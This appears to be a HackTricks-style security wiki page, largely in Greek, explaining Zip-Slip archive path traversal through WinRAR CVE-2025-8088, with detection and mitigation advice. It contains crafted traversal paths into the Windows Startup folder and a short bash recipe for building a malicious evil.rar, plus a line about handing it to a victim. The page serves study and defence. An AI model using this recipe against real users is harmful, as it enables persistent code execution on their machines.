# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Overview

Πολλές μορφές αρχείων (ZIP, RAR, TAR, 7-ZIP, κ.λπ.) επιτρέπουν σε κάθε εγγραφή να φέρει το δικό της **εσωτερικό μονοπάτι**. Όταν ένα εργαλείο εξαγωγής τιμά τυφλά αυτό το μονοπάτι, ένα κατασκευασμένο όνομα αρχείου που περιέχει `..` ή ένα **απόλυτο μονοπάτι** (π.χ. `C:\Windows\System32\`) θα γραφτεί εκτός του επιλεγμένου καταλόγου από τον χρήστη. Αυτή η κατηγορία ευπάθειας είναι ευρέως γνωστή ως *Zip-Slip* ή **archive extraction path traversal**.

Οι συνέπειες κυμαίνονται από την επαναγραφή αυθαίρετων αρχείων έως την άμεση επίτευξη **remote code execution (RCE)** ρίχνοντας ένα payload σε μια **auto-run** τοποθεσία όπως ο φάκελος *Startup* των Windows.

## Root Cause

1. Ο επιτιθέμενος δημιουργεί ένα αρχείο όπου μία ή περισσότερες κεφαλίδες αρχείων περιέχουν:
* Σειρές σχετικής διαδρομής (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Απόλυτα μονοπάτια (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Το θύμα εξάγει το αρχείο με ένα ευάλωτο εργαλείο που εμπιστεύεται το ενσωματωμένο μονοπάτι αντί να το καθαρίζει ή να αναγκάζει την εξαγωγή κάτω από τον επιλεγμένο κατάλογο.
3. Το αρχείο γράφεται στην τοποθεσία που ελέγχεται από τον επιτιθέμενο και εκτελείται/φορτώνεται την επόμενη φορά που το σύστημα ή ο χρήστης ενεργοποιεί αυτό το μονοπάτι.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR για Windows (συμπεριλαμβανομένων των `rar` / `unrar` CLI, της DLL και της φορητής πηγής) απέτυχε να επικυρώσει τα ονόματα αρχείων κατά την εξαγωγή. Ένα κακόβουλο αρχείο RAR που περιέχει μια εγγραφή όπως:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
θα κατέληγε **έξω** από τον επιλεγμένο φάκελο εξόδου και μέσα στον *Φάκελο Εκκίνησης* του χρήστη. Μετά την είσοδο, τα Windows εκτελούν αυτόματα όλα όσα υπάρχουν εκεί, παρέχοντας *μόνιμο* RCE.

### Δημιουργία ενός PoC Αρχείου (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – αποθήκευση διαδρομών αρχείων ακριβώς όπως δίνονται (μην αφαιρείτε το `./`).

Παραδώστε το `evil.rar` στο θύμα και δώστε τους οδηγίες να το εξάγουν με μια ευάλωτη έκδοση του WinRAR.

### Παρατηρούμενη Εκμετάλλευση στην Πραγματικότητα

Η ESET ανέφερε καμπάνιες spear-phishing RomCom (Storm-0978/UNC2596) που επισύναψαν αρχεία RAR εκμεταλλευόμενα το CVE-2025-8088 για να αναπτύξουν προσαρμοσμένα backdoors και να διευκολύνουν τις επιχειρήσεις ransomware.

## Συμβουλές Ανίχνευσης

* **Στατική επιθεώρηση** – Καταγράψτε τις καταχωρίσεις του αρχείου και σημειώστε οποιοδήποτε όνομα περιέχει `../`, `..\\`, *απόλυτες διαδρομές* (`C:`) ή μη κανονικοποιημένες κωδικοποιήσεις UTF-8/UTF-16.
* **Εξαγωγή σε sandbox** – Αποσυμπιέστε σε έναν αναλώσιμο φάκελο χρησιμοποιώντας έναν *ασφαλή* extractor (π.χ., Python’s `patool`, 7-Zip ≥ τελευταίας έκδοσης, `bsdtar`) και επαληθεύστε ότι οι προκύπτουσες διαδρομές παραμένουν μέσα στον φάκελο.
* **Παρακολούθηση τερματικών** – Ειδοποιήστε για νέα εκτελέσιμα που γράφονται σε τοποθεσίες `Startup`/`Run` λίγο μετά το άνοιγμα ενός αρχείου από το WinRAR/7-Zip/κ.λπ.

## Μετριασμός & Σκληραγώγηση

1. **Ενημερώστε τον extractor** – Το WinRAR 7.13 εφαρμόζει σωστή απολύμανση διαδρομών. Οι χρήστες πρέπει να το κατεβάσουν χειροκίνητα γιατί το WinRAR δεν διαθέτει μηχανισμό αυτόματης ενημέρωσης.
2. Εξάγετε αρχεία με την επιλογή **“Αγνόησε διαδρομές”** (WinRAR: *Εξαγωγή → "Μη εξαγωγή διαδρομών"*) όταν είναι δυνατόν.
3. Ανοίξτε μη αξιόπιστα αρχεία **μέσα σε sandbox** ή VM.
4. Εφαρμόστε λευκή λίστα εφαρμογών και περιορίστε την πρόσβαση εγγραφής χρηστών σε καταλόγους αυτόματης εκκίνησης.

## Πρόσθετες Επηρεαζόμενες / Ιστορικές Περιπτώσεις

* 2018 – Μαζική *Zip-Slip* προειδοποίηση από την Snyk που επηρεάζει πολλές βιβλιοθήκες Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 παρόμοια διαδρομή κατά τη διάρκεια συγχώνευσης `-ao`.
* Οποιαδήποτε προσαρμοσμένη λογική εξαγωγής που αποτυγχάνει να καλέσει `PathCanonicalize` / `realpath` πριν από την εγγραφή.

## Αναφορές

- [BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip vulnerability write-up](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
